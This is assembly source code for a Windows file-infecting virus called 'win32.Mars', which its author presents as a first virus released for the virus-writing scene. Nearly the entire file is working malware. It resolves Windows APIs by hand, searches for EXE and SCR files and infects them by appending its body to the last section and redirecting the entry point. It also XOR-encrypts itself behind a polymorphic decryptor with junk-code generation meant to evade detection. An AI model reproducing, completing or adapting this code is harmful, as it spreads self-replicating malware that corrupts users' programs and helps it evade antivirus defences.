;EasyCodeName=Mars,1
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-;
;						win32.Mars											;
;								by Tiberio Degano							;
;																			;
;																			;
;																			;
;Introduction:																;
;-------------																;
;this is my first virus overall it's a lame virus really but not bad for	;
;first time.I begin in this virus in 2006 and nearby finished it in 2007	;
;but (I don't know why )I leave VXing at this time and didn't publish it	;
;when I return into vxing I decide to publish it .my last word I hope you	;
;enjoyed .																	;
;																			;
;Features:																	;
;---------																	;
;1.encrypted (very lame with xor)											;
;2. simple poly (BrokenHeart Polymorphic Engine) not bad but need more junk	;
;	to be added																;
;																			;
;																			;
;enjoy																		;
;																			;
;:)																			;
;																			;
;																			;
;																			;
;																			;
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-;




.586
.Model flat, StdCall
Option CaseMap:none
Include	C:\masm32\include\windows.inc
Include	C:\masm32\include\kernel32.inc
IncludeLib	C:\masm32\lib\kernel32.lib

.Data
DB 0
VIRUS_BODY_SIZE Equ (Virus_End - VIRUS_START)
VIRUS_BODY_SIZE_ALIGNED Equ (Virus_End - VIRUS_START) / 4 - 1
;VIRUS_DECRYPTOR_SIZE EQU (DECRYPT_END-DECRYPT_START)
.Code
Assume Fs:Nothing
March:
;DECRYPT_START:
 ;_@D1: mov edi,VIRUS_START							;the begin of decrypt
 ;_@D2: mov ebx,00000000h							;the decrypt key
 ;_@D3: mov ecx,00000004h							;the size of data to decrypt
 ;_@D4: xor Dword Ptr [edi],ebx
 ;      add edi,4
 ;      sub ecx,4
 ;      or ecx,ecx
  ;     jnz  _@D4
  ;     jmp VIRUS_START
;DECRYPT_END:

VIRUS_START:
	;int 3
	Call Delta
Delta:												; Get the Delta offset
 	Mov Ebx, [Esp]
 	Sub Ebx, Offset Delta
 	Mov Esi, DWord Ptr [Esp + 4]
 	And Esi, 0FFFF0000H
 	PushAD
 	Push Ebx
 	rdtsc
 	Pop Ebx
 	Mov DWord Ptr [Ebx+RandomBuffer],Eax
 	Mov DWord Ptr [Ebx+RandomBuffer+4],Ecx
 	Mov Ecx, 5
 	Call GetKernelBase
 	Or Eax, Eax
 	Jnz InfectFail
 	Call GetProcAddr
 	Or Eax, Eax
 	Jz InfectFail
 	Mov Esi, Eax
 	;call GetWriteAccess
 	Mov DWord Ptr [Ebx + _GetProcAddress], Eax
	Mov DWord Ptr [Ebx + kernel], Edx
	Mov Esi, Eax
	Mov Edi, Edx
 	Call GetAPIs
  	Mov Esi, [Ebx + _GetProcAddress]
  	Call GetU32API
	Lea Esi, [Ebx + EXESearch]
	Call InfectAll
	Lea Esi, [Ebx + SCRSearch]
	Call InfectAll
	Push MB_OK
 	Lea Edi, [Ebx + szTitle]
 	Push Edi
 	Lea Edi, [Ebx + szMessage]
 	Push Edi
 	Push 0
 	Call [Ebx + _MessageBox]
InfectFail:
 	Cmp Ebx, 0
 	Je FakeHost

 	Mov Eax, DWord Ptr [Ebx + OldEIP]
 	Add Eax, DWord Ptr [Ebx + ModBase]
 	Call Eax
 	PopAD
 	;ret
FakeHost:
 	PopAD
 	;int 3

 	Invoke  ExitProcess, NULL

;---------------------------------------------------------------------------------
;																				 ;
;                              Get Kernel Base 									 ;
;																				 ;
;---------------------------------------------------------------------------------

 ;Prameters: esi --> first kernel test address
 ;           ecx --> number of pages (mul 10,000)
 ;           ebx --> delta
 ;Returns :	 esi --> real kernel base
 ;Error : 	 eax become non-zero

 GetKernelBase Proc
_@1:
 	Cmp Word Ptr [Esi], "ZM"
 	Je _@3
_@2:
    Dec Ecx
    Jz KernelFail
    Sub Esi, 00010000H
    Jmp _@1
_@3:
    Mov Eax, [Esi].IMAGE_DOS_HEADER.e_lfanew
    Add Eax, Esi
    Cmp Word Ptr [Eax], "EP"
    Jne KernelFail
_@4:
 	Xor Eax, Eax
 	Ret
KernelFail:
 	Mov Eax, 1	;non-zero
 	Ret
 GetKernelBase EndP

;---------------------------------------------------------------------------------
;																				 ;
;                              GetProcAddress 									 ;
;																				 ;
;---------------------------------------------------------------------------------

 ;Prameters: esi --> Kernel Base
 ;           ebx --> delta
 ;Returns :  eax --> GetProcAddress
 ;			 edx --> Kernel Base
 ;Error : 	 eax become zero

 GetProcAddr Proc
 Local AddressFunctions:DWord
 Local AddressNames:DWord
 Local AddressNamesOrd:DWord
_@1:
 	Mov Edx, Esi								;Kernel base
    Mov Eax, [Esi].IMAGE_DOS_HEADER.e_lfanew
    Add Eax, Esi
    Cmp Word Ptr [Eax], "EP"
	Jnz GetProcAddrFail

_@2:
 	Mov Esi, Eax
 	Mov Eax, [Esi].IMAGE_NT_HEADERS.OptionalHeader.DataDirectory[0].VirtualAddress
 	Add Eax, Edx
 	Mov Esi, Eax

 	Mov Eax, [Esi].IMAGE_EXPORT_DIRECTORY.AddressOfFunctions
 	Add Eax, Edx
 	Mov DWord Ptr [AddressFunctions], Eax

  	Mov Eax, [Esi].IMAGE_EXPORT_DIRECTORY.AddressOfNames
 	Add Eax, Edx
 	Mov DWord Ptr [AddressNames], Eax

  	Mov Eax, [Esi].IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals
 	Add Eax, Edx
 	Mov DWord Ptr [AddressNamesOrd], Eax
 	Push Ebx
 	 											;1st push
 	Mov Edi, AddressNames
 	Push Ebp                                    ;2nd push
 	Mov Ebp, Ebx
 	Xor Ebx, Ebx
 	Mov Esi, Edi
_@3:
 	;int 3

    Lodsd
    Push Esi                                   ;3rd push
    Lea Edi, [Edx + Eax]
    ;pushad
	Lea Esi, [Ebp + szGetProcAddress]
    Mov Cl, Byte Ptr [Ebp + szGetProcAddress - 1]
    Repz Cmpsb
    ;popad
    Jz FoundAddress
    Inc Ebx
    Pop Esi												;3rd pop
    Cmp Ebx, [Esi].IMAGE_EXPORT_DIRECTORY.NumberOfNames
    Jnz _@3
GetProcAddrFail:
 	Pop Ebp												;2nd pop
 	Pop Ebx												;1st pop
 	Xor Eax, Eax
 	Ret
FoundAddress:
	Pop Esi
	Mov Esi, Edx
	Pop Ebp
    Mov Eax, [Esi].IMAGE_DOS_HEADER.e_lfanew
    Add Eax, Esi
    Mov Esi, Eax
	Mov Eax, DWord Ptr [AddressNamesOrd]
	Mov Edi, Eax
	Movzx Eax, Word Ptr [Edi + Ebx * 2]
	Mov Ebx, Eax
	Mov Eax, AddressFunctions
    Mov Edi, Eax
	Mov Eax, DWord Ptr [Edi + Ebx * 4]
	Pop Ebx
	Add Eax, Edx					;eax --> GetProcAddress
	Ret
 GetProcAddr EndP

;---------------------------------------------------------------------------------
;																				 ;
;                              GetWriteAccess 									 ;
;																				 ;
;---------------------------------------------------------------------------------

 ;Prameters: esi --> GetProcAddress
 ;           ebx --> delta
 ;Returns :  eax --> VirtualProtect Address

 ;GetWriteAccess Proc
 ;	push edx
;	push eax
;	movzx eax,Byte Ptr [ebx+ szVirtualProtect-1]
 ;	push eax
 ;	lea edi,[ebx+szVirtualProtect]
 ;	push edi
 ;	push edx
 ;	call esi
 ;	push esp
;	push PAGE_EXECUTE_READWRITE
;	push VIRUS_BODY_SIZE
;	lea edi,[ebx + VIRUS_START]
 ;	push edi
 ;	call eax
;	add esp,4										;Here don't ask me why ?   this when error debugging
 ;	pop eax
 ;	pop edx
 ;	ret
;GetWriteAccess EndP

;---------------------------------------------------------------------------------
;																				 ;
;                              Get All APIs 									 ;
;																				 ;
;---------------------------------------------------------------------------------

 ;Prameters: esi --> GetProcAddress
 ;           ebx --> delta
 ;			 edi --> Kernel Base

 GetAPIs Proc
_@1:
	Push Ebx
 	Push Edi
 	Lea Ebx, [Ebx + Offset API_TABLE]
_@2:
  	Movzx Ecx, Byte Ptr [Ebx]
 	Push Ecx
 	Inc Ebx
 	Lea Edx, [Ebx]
 	Add Ebx, Ecx					;the API Address
 	Push Edx
 	Push Edi
 	Call Esi
	Mov DWord Ptr [Ebx], Eax
	Add Ebx, 4
	Add Esp, 4					;Error Debugging
Cmp Byte Ptr [Ebx], 0BBH
	Jnz _@2
 	Pop Edx
	Pop Ebx
Ret


GetAPIs EndP

;---------------------------------------------------------------------------------
;																				 ;
;                              Get USER32 APIs 									 ;
;																				 ;
;---------------------------------------------------------------------------------

 ;Prameters: esi --> GetProcAddress
 ;           ebx --> delta
 ;Returns :  eax --> MessageBoxA Address or null if error occur

GetU32API Proc
_@1:
	Push Ebx
	Lea Edi, [Ebx + szUser32]
 	Push Edi
 	Call DWord Ptr [Ebx + _LoadLibrary]
 	Mov DWord Ptr [Ebx + _User32], Eax
 	Lea Ebx, [Ebx + Offset USER32API]
_@2:
  	Movzx Ecx, Byte Ptr [Ebx]
 	Push Ecx
 	Inc Ebx
 	Lea Edx, [Ebx]
 	Add Ebx, Ecx					;the API Address
 	Push Edx
 	Push Eax
 	Call Esi
	Mov DWord Ptr [Ebx], Eax
	Add Esp, 4					;Error Debugging
	Pop Ebx
	Ret
GetU32API EndP
 ;---------------------------------------------------------------------------------
 ;																				  ;
 ;                       Searching For Files to Infect							  ;
 ;																				  ;
 ;---------------------------------------------------------------------------------

 ;Prameters: ebx --> delta
 ;			 esi --> Search Pattren

InfectAll Proc
_@1:
	;int 3
	PushAD
	Lea Edi, [Ebx + CurrentDir]
	Push Edi
	Push MAX_PATH
	Call [Ebx + _GetCurrentDirectory]
	Push Edi
	Call [Ebx + _SetCurrentDirectory]
	Lea Edi, [Ebx + FindData]
	Push Edi
	;lea edi,[ebx+EXESearch]
	Push Esi
	Call [Ebx + _FindFirstFile]
	Cmp Eax, 0FFFFFFFFH
	Je _@3
	Mov DWord Ptr [Ebx + hFind], Eax
	Lea Esi, [Ebx + FindData.cFileName]
	Mov Ecx, [Ebx + FindData.nFileSizeLow]
	Push [Ebx + OldEIP]
	Push [Ebx + ModBase]
	Call InfectFile
	Pop [Ebx + OldEIP]
	Pop [Ebx + ModBase]

	;call InfectFile
_@2:
	;lea esi,[ebx+FindData.cFileName]
	Lea Edi, [Ebx + FindData]
	Push Edi
	Mov Edi, DWord Ptr [Ebx + hFind]
	Push Edi
	Call [Ebx + _FindNextFile]
	Or Eax, Eax
	Jz _@3
	Lea Esi, [Ebx + FindData.cFileName]
	Mov Ecx, [Ebx + FindData.nFileSizeLow]
	Push [Ebx + OldEIP]
	Push [Ebx + ModBase]
	Call InfectFile
	Pop [Ebx + OldEIP]
	Pop [Ebx + ModBase]
	Jmp _@2

_@3:
	Mov Edi, DWord Ptr [Ebx + hFind]
	Push Edi
	Call [Ebx + _FindClose]
	PopAD
	Ret
InfectAll EndP
 ;---------------------------------------------------------------------------------
 ;																				  ;
 ;                              Infect a File								  	  ;
 ;																				  ;
 ;---------------------------------------------------------------------------------

 ;Prameters: ebx --> delta
 ;			 esi --> Address of filename
 ;			 ecx --> FileSize

InfectFile Proc

Local hFile:DWord
Local hMap:DWord
Local lpFilePointer:DWord
Local NumSecs:Word
Local OldEP:DWord
Local ImgBase:DWord
Local NewSize:DWord
Local NewEP:DWord
Local FileSize:DWord
Local nAlign:DWord
Local VIRUS_DECRYPTOR_SIZE:DWord
Local XorKey:DWord
_@01:
	;int 3
	Push Esi
	Mov DWord Ptr FileSize, Ecx
	Call OpenAFile
	Or Eax, Eax
	Jz _@4
	Mov DWord Ptr hFile, Eax
	Mov Ecx, FileSize
	Call CreateMap
	Or Eax, Eax
	Jz _@4
	Mov hMap, Eax
	Mov Ecx, FileSize
	Call MapFile
	Or Eax, Eax
	Jz _@4
	Mov lpFilePointer, Eax
	Mov Esi, Eax
_@02:
	;int 3
	Cmp Word Ptr [Esi], "ZM"
	Jnz _@4
	Mov Edi, [Esi].IMAGE_DOS_HEADER.e_lfanew
	Add Edi, Esi
	Cmp Word Ptr [Edi], "EP"
	Jnz _@4
	Cmp DWord Ptr [Esi + 4EH], "suhT"
	Jz _@4
	Mov Esi, Edi
	Mov Edx, [Esi].IMAGE_NT_HEADERS.OptionalHeader.FileAlignment
	Mov nAlign, Edx

_@02_2:		;Get Decryptor Pointer for Poly
	Xor Eax, Eax
	Mov Ax, [Esi].IMAGE_NT_HEADERS.FileHeader.NumberOfSections
	Mov Word Ptr [NumSecs], Ax
	Mov Eax, [Esi].IMAGE_NT_HEADERS.OptionalHeader.NumberOfRvaAndSizes
	Mov Edx, SizeOf IMAGE_DATA_DIRECTORY
	IMul Edx
	Add Edi, Eax
	Xor Eax, Eax
	Mov Ax, Word Ptr [NumSecs]
	Dec Eax
	Mov Edx, SizeOf IMAGE_SECTION_HEADER
	IMul Edx
	Add Edi, Eax
	Add Edi, 78H						;edi --> last Section Header & esi --> PE Header
	Mov Edx, [Edi].IMAGE_SECTION_HEADER.SizeOfRawData
	Add Edx, [Edi].IMAGE_SECTION_HEADER.VirtualAddress
	Add Edx, [Esi].IMAGE_NT_HEADERS.OptionalHeader.ImageBase
_@02_3:
	PushAD
	Mov Edi, Edx
	Mov Ecx, VIRUS_BODY_SIZE
	Mov Eax, Ecx
	Mov Ecx, 4
	Call AlignSize
	Mov Ecx, Eax
	Call [Ebx + _GetTickCount]		;put eax -->xor key
	Mov XorKey, Eax
	Mov Edx, 1
	Call BHPE
	Mov VIRUS_DECRYPTOR_SIZE, Eax
	PopAD
_@03:
	Mov Edx, DWord Ptr [lpFilePointer]
	Push Edx
	Call [Ebx + _CloseMap]
	Mov Edx, DWord Ptr [hMap]
	Push Edx
	Call [Ebx + _CloseHandle]
	Mov Edx, DWord Ptr [hFile]
	Push Edx
	Call [Ebx + _CloseHandle]

_@1:
	Pop Esi
	Call OpenAFile
	Or Eax, Eax
	Jz _@4
	Mov DWord Ptr hFile, Eax
	Push Eax
	Mov Ecx, FileSize
	Add Ecx, VIRUS_BODY_SIZE
	Add Ecx, VIRUS_DECRYPTOR_SIZE
	Mov Eax, Ecx
	Mov Ecx, nAlign
	Call AlignSize
	Mov Ecx, Eax
	Pop Eax
	Call CreateMap
	Or Eax, Eax
	Jz _@4
	Mov hMap, Eax
	Push Eax
	Mov Ecx, DWord Ptr FileSize
	Add Ecx, VIRUS_BODY_SIZE
	Add Ecx, VIRUS_DECRYPTOR_SIZE
	Mov Eax, Ecx
	Mov Ecx, nAlign
	Call AlignSize
	Mov Ecx, Eax
	Pop Eax
	Call MapFile
	Or Eax, Eax
	Jz _@4
	Mov lpFilePointer, Eax
	Mov Esi, Eax
_@2:
	Cmp Word Ptr [Esi], "ZM"
	Jnz _@4
	Mov Edi, [Esi].IMAGE_DOS_HEADER.e_lfanew
	Add Edi, Esi
	Cmp Word Ptr [Edi], "EP"
	Jnz _@4
	Mov Esi, Edi
_@3:
	Xor Eax, Eax
	Mov Eax, [Esi].IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint
	Mov DWord Ptr [Ebx + OldEIP], Eax
	Mov Eax, [Esi].IMAGE_NT_HEADERS.OptionalHeader.ImageBase
	Mov DWord Ptr [Ebx + ModBase], Eax
	Mov Eax, [Esi].IMAGE_NT_HEADERS.OptionalHeader.NumberOfRvaAndSizes
	Mov Edx, SizeOf IMAGE_DATA_DIRECTORY
	IMul Edx
	Add Edi, Eax
	Xor Eax, Eax
	Mov Ax, Word Ptr [NumSecs]
	Dec Eax
	Mov Edx, SizeOf IMAGE_SECTION_HEADER
	IMul Edx
	Add Edi, Eax
	Add Edi, 78H						;edi --> last Section Header & esi --> PE Header
	Mov Eax, [Edi].IMAGE_SECTION_HEADER.VirtualAddress
	Add Eax, [Edi].IMAGE_SECTION_HEADER.SizeOfRawData
	Mov [Esi].IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint, Eax
	Mov Ecx, [Edi].IMAGE_SECTION_HEADER.SizeOfRawData
	Mov Edx, [Edi].IMAGE_SECTION_HEADER.PointerToRawData
	Add Edx, Ecx
	Push Edx
	Add Ecx, VIRUS_BODY_SIZE
	Add Ecx, VIRUS_DECRYPTOR_SIZE
	Mov Eax, Ecx
	Mov Ecx, nAlign
	Call AlignSize
	Mov Ecx, Eax
	;int 3
	Push Edx
	Mov Edx, [Edi].IMAGE_SECTION_HEADER.SizeOfRawData
	Add Edx, [Edi].IMAGE_SECTION_HEADER.VirtualAddress
	Add Edx, [Esi].IMAGE_NT_HEADERS.OptionalHeader.ImageBase
	;add edx,esi
	;sub edx,lpFilePointer

	;mov Dword Ptr [ebx+_@D1+1],edx
	;add Dword Ptr [ebx+_@D1+1],Offset VIRUS_START
	;add Dword Ptr [ebx+_@D1+1],VIRUS_DECRYPTOR_SIZE

	Pop Edx
	Mov DWord Ptr NewSize, Ecx
	Mov [Edi].IMAGE_SECTION_HEADER.Misc.VirtualSize, Ecx
	Mov [Edi].IMAGE_SECTION_HEADER.SizeOfRawData, Ecx
	Mov Edx, [Edi].IMAGE_SECTION_HEADER.VirtualAddress
	Add Edx, Ecx
	Mov [Esi].IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage, Edx
	;Or DWord Ptr [Edi].IMAGE_SECTION_HEADER.Characteristics, SECTION_ALL_ACCESS ;0A0000020h
	Mov DWord Ptr [Edi].IMAGE_SECTION_HEADER.Characteristics,0E0000040H
	Mov Edi, DWord Ptr lpFilePointer
	Mov DWord Ptr [Edi + 4EH], "suhT"
	Pop Edx
	Add Edx, lpFilePointer
	Mov Edi, Edx
	Mov Edx, Ebx
	;pop ebx

	Mov Edx, XorKey
	;mov edx,02F46ACD3h
	Push Edx

	;mov Dword Ptr [ebx+_@D2+1],edx
	Mov Ecx, VIRUS_BODY_SIZE
	Mov Eax, Ecx
	Mov Ecx, 4
	Call AlignSize
	Push Eax
	;mov Dword Ptr [ebx+_@D3+1],eax
	Lea Esi, [Ebx + PolyDecrypt]
    Mov Ecx, VIRUS_DECRYPTOR_SIZE
    Xor Eax, Eax
    Rep Movsb
	Lea Esi, [Ebx + VIRUS_START]
	Pop Ecx
	;mov ecx,VIRUS_BODY_SIZE
	Xor Eax, Eax
	Pop Edx

Loop1:
	Mov Eax, DWord Ptr [Esi]
	Xor Eax, Edx
	Mov DWord Ptr [Edi], Eax
	Add Esi, 4
	Add Edi, 4
      Sub Ecx, 4
      Cmp Ecx, 3
      Jz _@4
      Cmp Ecx, 2
      Jz _@4
      Cmp Ecx, 1
      Jz _@4
      Or Ecx, Ecx
      Jnz Loop1
_@4:
	Xor Eax, Eax
	Cmp DWord Ptr [lpFilePointer], Eax
	Jz _@5
	Mov Edx, DWord Ptr [lpFilePointer]
	Push Edx
	Call [Ebx + _CloseMap]
	Xor Eax, Eax
	Cmp DWord Ptr [hMap], Eax
	Jz _@5
	Mov Edx, DWord Ptr [hMap]
	Push Edx
	Call [Ebx + _CloseHandle]
	Xor Eax, Eax
	Cmp DWord Ptr [hFile], Eax
	Jz _@5
	Mov Edx, DWord Ptr [hFile]
	Push Edx
	Call [Ebx + _CloseHandle]
_@5:
	Ret
InfectFile EndP
 ;---------------------------------------------------------------------------------
 ;																				  ;
 ;                              Polymorphism 								  	  ;
 ;																				  ;
 ;---------------------------------------------------------------------------------

 ;-=-=-=-=-=-=-=-=-=-=-=-== Brocken Heart Polymorphic Engine =-=-=-=-=-=-=-=-=-=--=-=-=-=-=-

Junk Proto	uDWORD
; edi --> Decrypt Pointer
; ecx --> Virus Size
; ebx --> Delta offset
; edx --> Decrypt Table
; eax --> Xor Key
;
;Return:
;-=-=-=-
; eax --> Decryptor Size

BHPE Proc
Local DecryptPointer:DWord
Local XorKey:DWord
Local VirusSize:DWord
Local FirstIns:DWord
Local DecryptTable:DWord
Local bgnLoop:DWord
Local DecryptorEnd:DWord
Local RegPointer:Byte

	;push 1									;all registers not restricted but esp & ebp restricted
	;call FillBytes							;Garpage
	Mov DecryptPointer, Edi
	Lea Edi, [PolyDecrypt]
	Add Edi, Ebx								;add delta offset
	;mov  BYTE PTR [edi],060h				;Pushad : to make us have 8 free variables in stack
	;inc edi								;for grapage (60=Pushad)
	;push 4									;all not restricted
	;call FillBytes							;garpage
	;mov eax,0FFFFFFFFh
	;push ecx
	;call GetRandomNum						;for Xor key
	;pop ecx
	Mov VirusSize, Ecx						;Save variable for later use
	Mov XorKey, Eax							; ,,    ,,     ,,   ,,   ,,
											; ,,    ,,     ,,   ,,   ,,
	Mov DecryptTable, Edx					; ,,    ,,     ,,   ,,   ,,
	Mov Eax, 03H								;0,1,2
	Call GetRandomNum						;for random register
	Or Eax, Eax
	Jnz _@Test2
	Mov Eax, 3								;ebx
	Jmp EndTest
_@Test2:
	Add Eax, 5								;esi & edi
EndTest:
	Mov RegPointer, Al
	Mov Byte Ptr [Edi], 0B8H 				;0B8 => mov eax
	Add Byte Ptr [Edi], Al					;make it mov edi or mov esi
	Inc Edi
	Push Eax
	Mov Eax, (DecryptPointer)				;put in imm32 --> Pointer to virus body
	;add eax,DECRYPT_SIZE
	Mov DWord Ptr [DecryptorEnd], Edi
	Mov DWord Ptr [Edi], Eax
	Pop Eax
	Add Edi, 4
	;push edi								;RegPointer Restricted
	;call FillBytes							;some junk
	Mov bgnLoop, Edi
;-=-=-=-=-=-= Decryptor Constant =-=-=-=-=-=-=-=-=-
	Lea Esi, [Ebx + MultiDecryptTable]
	Movzx Eax, Byte Ptr [Esi]   			;choose the decryptor
	Cmp Eax, DecryptTable					; test if upper
	Inc Esi
	Jbe dyptBegin
	Mov Eax, DecryptTable
dyptBegin:
	Dec Eax
	Mov Esi, DWord Ptr [Esi + Eax * 4]
	Add Esi, Ebx
	Movzx Ecx, Byte Ptr [Esi]
	Inc Esi
	Dec Ecx
	Xor Edx, Edx
AddDecryptor:
	Push Esi
	Push Ecx
	Mov Esi, DWord Ptr [Esi + Edx * 4]

	Add Esi, Ebx
ChooseConst:
	Movzx Eax, Byte Ptr [Esi]
	Inc Esi
	Push Edx
	Call GetRandomNum
	Pop Edx
	Mov Esi, DWord Ptr [Esi + Eax * 4]
	Add Esi, Ebx
	Movzx Ecx, Byte Ptr [Esi]
	Cmp Edx, 0
	Jnz _@454754
	Add bgnLoop, Ecx
_@454754:
	Inc Esi
	;push esi
	Push Ecx
	Push Edi
CopyConst:
	Mov Al, Byte Ptr [Esi]
	Mov Byte Ptr [Edi], Al
	Inc Esi
	Inc Edi
	Dec Ecx
	Cmp Ecx, 0
	Jnz CopyConst
CheckPramaters:
	Cmp Byte Ptr [Esi], 0BBH
	Jz EndCheck
	;pop ecx
	;pop esi
	Pop Edi
	Push Edi
	Movzx Eax, Byte Ptr [Esi]
	Dec Eax
	Add Edi, Eax
	Inc Esi
	Mov Eax, DWord Ptr [Esi]
	Sub DWord Ptr [Edi], Eax
	Add Esi, 4
	Movzx Eax, Byte Ptr [Esi]
	Inc Esi
	Cmp Eax, 0			;Virus Size
	Jnz case_2
	Mov Eax, VirusSize
	Add DWord Ptr [Edi], Eax
	Jmp finnaly
case_2:
	Cmp Eax, 1			;RegPointer
	Jnz case_3
	Movzx Eax, RegPointer
	Add Byte Ptr [Edi], Al
	Jmp finnaly
case_3:
	Cmp Eax, 2			;XorKey
	Jnz case_4
	Mov Eax, XorKey
	Add DWord Ptr [Edi], Eax
	Jmp finnaly
case_4:
	Mov Eax, Edi
	Add Eax, 4			;for size of DWORD to modify
	Sub Eax, bgnLoop
	Sub DWord Ptr [Edi], Eax
finnaly:
	Jmp CheckPramaters
EndCheck:
	Pop Edi				;del edi
	Pop Ecx
	Add Edi, Ecx
	Xor Eax, Eax
	Push Edx
	Push Edi
	Call FillBytes
	Invoke Junk, 5
	Pop Edx
	Inc Edx
	Pop Ecx
	Pop Esi
	Cmp Edx, Ecx
	Jbe AddDecryptor
	Mov Eax, Edi
	Lea Ecx, [PolyDecrypt]
	Add Ecx, Ebx
	Sub Eax, Ecx
	Mov Edi, DWord Ptr [DecryptorEnd]
	Add DWord Ptr [Edi], Eax
	Ret
BHPE EndP

FillBytes Proc DecryptPtr:DWord
	Local FirstPtr:DWord
	Local SecondPtr:DWord
	Local ThirdPtr:DWord

	Mov Edi, DecryptPtr
	Mov Byte Ptr [Edi], 0E8H			;call opcode
	Inc Edi
	Mov DWord Ptr [Edi], 0H			;the relative ptr will be putted here
	Add Edi, 4
	Mov FirstPtr, Edi
	Mov Eax, 10H
	Call GetRandomNum
	Invoke Junk, Eax

	Mov Byte Ptr [Edi], 0EBH
	Inc Edi
	Mov Byte Ptr [Edi], 0
	Inc Edi
	Mov SecondPtr, Edi
	Mov Eax, Edi
	Sub Eax, FirstPtr
	Mov Edi, FirstPtr
	Sub Edi, 4
	Mov DWord Ptr [Edi], Eax
	Mov Edi, SecondPtr

	Mov Eax, 10H
	Call GetRandomNum
	Invoke Junk, Eax
	Mov Byte Ptr [Edi], 0C3H
	Inc Edi
	Mov ThirdPtr, Edi
	Push Edi
	Mov Eax, Edi
	Sub Eax, SecondPtr
	Mov Edi, SecondPtr
	Dec Edi
	Mov Byte Ptr [Edi], Al
	Pop Edi

	Mov Eax, 10H
	Call GetRandomNum
	Invoke Junk, Eax
	Ret 4
FillBytes EndP

;ebx --> delta offset
;edi -->decrypt code pointer

Junk Proc, nBytes:DWord
	Push Edx
junk_start:
	Mov Eax, nOpcodes
	Call GetRandomNum
	Inc Eax
	.If Eax == 1
		Lea Esi, DWord Ptr [opcodes_1]
		Add Esi, Ebx
		Movzx Eax, Byte Ptr [Esi]
		Inc Esi
		Call GetRandomNum
		Add Esi, Eax
		Xor Eax, Eax
		Mov Al, Byte Ptr [Esi]
		Mov Byte Ptr [Edi], Al
		Inc Edi
		Dec nBytes
		Cmp nBytes, 0
		Jz junk_end
		Jg junk_start
	.ElseIf Eax == 2
		Cmp nBytes, 2
		Jb junk_start
		Lea Esi, DWord Ptr [opcodes_2]
		Add Esi, Ebx
		Movzx Eax, Byte Ptr [Esi]
		Inc Esi
		Call GetRandomNum
		IMul Eax, 2
		Add Esi, Eax
		Xor Eax, Eax
		Mov Ax, Word Ptr [Esi]
		Mov Word Ptr [Edi], Ax
		Inc Edi
		Inc Edi
		Sub nBytes, 2
		Cmp nBytes, 0
		Jz junk_end
		Jg junk_start
	.ElseIf Eax == 3
		Cmp nBytes, 5
		Jb junk_start
		Lea Esi, DWord Ptr [opcodes_5]
		Add Esi, Ebx
		Movzx Eax, Byte Ptr [Esi]
		Inc Esi
		Call GetRandomNum
		IMul Eax, 5
		Add Esi, Eax
		Xor Eax, Eax
		Mov Ecx, 5
		Rep Movs Byte Ptr [Esi], Byte Ptr [Esi]
		Sub nBytes, 5
		Cmp nBytes, 0
		Jz junk_end
		Jg junk_start
	.EndIf
junk_end:
	Xor Eax, Eax
	Pop Edx
	Ret
Junk EndP
PolyData:
PolyDataSize Equ (Offset PolyDataEnds - Offset PolyData)
DECRYPT_SIZE Equ 1024H
;-=-=-=-=-=-=-=-=-=-=-=-=-=-= Decryptor Constant Data =-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-

MultiDecryptTable:
	DB 1
	DD (Offset first_DecryptTable)
first_DecryptTable:						;the decryptor constant
	DB 6											;number of instructions
	DD (Offset Ains)						;mov ecx,VirusSize
	DD (Offset Bins)						;@1: mov eax,dword [edi]
	DD (Offset Cins)						;xor eax,XorKey
	DD (Offset Dins)						;stosd
	DD (Offset Fins)						;inc edi
	DD (Offset Eins)						;loop @1

Ains:							;Table of instructions that could be used
	DB 2						;number of constants for `1st instruction
	DD (Offset A_1cons)			;mov ecx,VirusSize
	DD (Offset A_2cons)			;push VirusSize   pop ecx
Bins:
	DB 2
	DD (Offset B_1cons)			;mov eax,dword ptr [edi]
	DD (Offset B_2cons)			;push dword ptr [edi]  pop eax
Cins:
	DB 1
	DD (Offset C_1cons)			;xor eax,XorKey
Dins:
	DB 2
	;dd (offset D_1cons)				;stosd
	DD (Offset D_2cons)			;mov dword ptr [edi],eax    add edi,4
	DD (Offset D_3cons)			;push dword ptr [edi]  pop eax
Eins:
	DB 2
	DD (Offset E_1cons)			;loop
	DD (Offset E_2cons)			;dec ecx   or ecx,ecx   jnz @1
Fins:
	DB 3
	DD (Offset F_1cons)			;inc edi
	DD (Offset F_2cons)			;add edi,1
	DD (Offset F_3cons)			;add 5 sub 4
A_1cons:
	DB 5
	Mov Ecx, 12345678H
	DB 2
	DD 12345678H
	DB 0, 0BBH
A_2cons:
	DB 6
	Push 12345678H
	Pop Ecx
	DB 2
	DD 12345678H
	DB 0, 0BBH
B_1cons:
	DB 2
	Mov Eax, DWord Ptr [Eax]
	DB 2
	DD 0
	DB 1, 0BBH
B_2cons:
	DB 3
	Push DWord Ptr [Eax]
	Pop Eax
	DB 2
	DD 0
	DB 1, 0BBH
C_1cons:
	DB 5
	Xor Eax, 12345678H
	DB 2
	DD 12345678H
	DB 2, 0BBH
D_1cons: 						;will be deleted
	DB 1
	Stosd
	DB 0BBH
D_2cons:
	DB 2
	Mov DWord Ptr [Eax], Eax
	DB 2
	DD 0
	DB 1, 0BBH
D_3cons:
	DB 3
	Push Eax
	Pop DWord Ptr [Eax]
	DB 3
	DD 0
	DB 1, 0BBH
E_1cons:
	DB 11
	Sub Ecx, 4
	Or Ecx, Ecx
	DB 0FH, 8FH
	DD 0FFFFFFFFH	;jg
	DB 8
	DD 0FFFFFFFFH
	DB 3, 0BBH
E_2cons:
	DB 11
	Sub Ecx, 4
	Or Ecx, Ecx
	DB 0FH, 85H
	DD 0FFFFFFFFH	;jnz
	DB 8
	DD 0FFFFFFFFH
	DB 3, 0BBH
F_1cons:
	DB 3
	Add Eax, 4
	DB 2
	DD 0
	DB 1, 0BBH
F_2cons:
	DB 3
	Add Eax, 4
	DB 2
	DD 0
	DB 1, 0BBH
F_3cons:
	DB 6
	Add Eax, 5
	Sub Eax, 1
	DB 2
	DD 0
	DB 1
	DB 5
	DD 0
	DB 1, 0BBH
